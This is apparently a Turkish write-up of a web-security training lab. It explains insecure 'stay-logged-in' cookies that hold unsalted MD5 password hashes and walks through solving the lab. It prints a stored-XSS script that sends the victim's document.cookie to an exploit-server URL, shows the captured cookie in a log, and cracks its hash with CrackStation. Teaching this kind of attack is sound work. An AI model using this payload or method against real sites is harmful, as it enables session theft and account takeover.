# Offline password cracking

## Konu Açıklaması (Keeping Users Logged In & Insecure Password Storage)

### 1. Keeping Users Logged In - Güvensiz Çerez Mimarisi
Kullanıcı oturumunun açık tutulması (Remember Me / Stay Logged In) mekanizmalarında, bazı uygulamalar oturumu doğrulamak için doğrudan kullanıcının şifresini veya şifre hash'ini çerez içerisinde saklar.
* **Açık Metin Parola:** Bazı nadir durumlarda çerez içerisinde parola doğrudan açık metin (clear-text) olarak taşınır.
* **Tuzsuz (Unsalted) Hash:** Parola hash'lenmiş olsa dahi, **salt (tuzlama)** uygulanmadığında yaygın parolalara ait hash değerleri (MD5, SHA-1 vb.) çevrimdışı gökkuşağı tabloları (rainbow tables) veya arama motorları üzerinden saniyeler içinde kırılabilir.

---

### 2. İstemci Taraflı Açıklar ve Çerez Hırsızlığı
Çerez yapısı tahmin edilemez olsa bile, web uygulamasında bulunan **Stored XSS (Depolanmış Siteler Arası Betik Çalıştırma)** gibi istemci taraflı zafiyetler aracılığıyla saldırganlar kurbanın oturum/beni hatırla çerezini çalabilir.
* Saldırgan, kurbanın tarayıcısında çalışacak bir JavaScript kodu (`document.cookie`) enjekte eder.
* Kurban sayfayı ziyaret ettiğinde, çerez verisi saldırganın kontrolündeki bir sunucuya (örneğin Burp Exploit Server) HTTP isteği ile sızdırılır.
* Ele geçirilen çerezdeki zayıf hash offline ortamda kırılarak kurbanın gerçek parolası ele geçirilir.

---

## Lab Çözümü

### Lab Bilgileri
- **Lab Adı:** Offline password cracking
- **Zafiyet Türü:** Authentication / Insecure Cookie Handling & Stored XSS (Offline Password Cracking)
- **Amaç:** `carlos` kullanıcısının `stay-logged-in` çerezini XSS açığı ile ele geçirmek, içerisindeki MD5 hash'ini offline kırarak şifresini bulmak ve hesaba giriş yaparak hesabı silmek.
- **Referans Bilgiler:**
  - **Hedef Kullanıcı:** `carlos`
  - **Kendi Hesabımız:** `wiener:peter`
  - **Araçlar:** Burp Suite, Exploit Server, CrackStation / Hash Cracking araçları

### Çözüm Adımları

1. **Çerez Formatının Analiz Edilmesi:**
   * Kendi geçerli kimlik bilgilerinizle (`wiener:peter`) giriş sayfasına gidin. **"Stay logged in"** seçeneğini işaretleyerek giriş yapın.
   * Burp Suite **HTTP history** üzerinden dönen yanıtı (`Set-Cookie`) inceleyin. `stay-logged-in` çerezinin atandığını tespit edin.
   * Base64 formatında kodlanmış bu değeri decode ettiğinizde şu yapıyla karşılaşılır:
     ```text
     wiener:51a3a...
     ```
   * İki noktanın (`:`) sağındaki değerin `peter` kelimesinin **MD5 hash**'i olduğu görülür. Buradan çerezin `username:md5(password)` formatında Base64 ile encode edildiği doğrulanır.

2. **XSS İstismar Kodunun Hazırlanması:**
   * Blog gönderilerinin altındaki yorum bölümünde Stored XSS zafiyeti bulunmaktadır.
   * Kurbanın (`carlos`) sayfayı ziyaret ettiğinde çerezlerini kontrolümüzdeki sunucuya göndermesini sağlamak için aşağıdaki zararlı script'i hazırlayın:
     ```html
     <script>
     document.location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?cookie=' + encodeURIComponent(document.cookie);
     </script>
     ```
     *(Veya `fetch` / `<img src="...">` kullanarak asenkron istek oluşturan bir payload da kullanılabilir).*

3. **Zararlı Yorumun Gönderilmesi ve Çerezin Çalınması:**
   * Hazırlanan payload'u blog yazısının yorum alanına yapıştırın ve yorumu gönderin.
   * Kurban kullanıcı (`carlos`) yorumu görüntülediğinde script otomatik olarak tetiklenir ve çerez bilgilerini Exploit Server'a iletir.

4. **Exploit Server Loglarının İncelenmesi:**
   * Exploit Server'a gidin ve **Access log** butonuna tıklayın.
   * Kurbanın tarayıcısından gelen HTTP isteğini bulun:
     ```http
     GET /log?cookie=secret=...;%20stay-logged-in=Y2FybG9zOm...
     ```
   * `stay-logged-in` parametresine ait Base64 değerini kopyalayın.

5. **Hash'in Çözülmesi (Offline Hash Cracking):**
   * Kopyalanan değeri Burp Decoder (veya terminalde `base64 -d`) ile decode edin:
     ```text
     carlos:26323c16d5f4fda3a44e708d1aa0fe4c
     ```
   * Elde edilen MD5 hash'ini [CrackStation](https://crackstation.net) veya arama motorunda aratarak açık metin karşılığını (şifreyi) bulun.

6. **Hesaba Giriş ve Carlos Hesabının Silinmesi:**
   * Elde edilen kimlik bilgileriyle (`carlos` ve bulunan parola) sisteme giriş yapın.
   * `/my-account` sayfasına gidin ve **"Delete account"** butonuna basarak Carlos'un hesabını silin ve laboratuvarı tamamlayın.
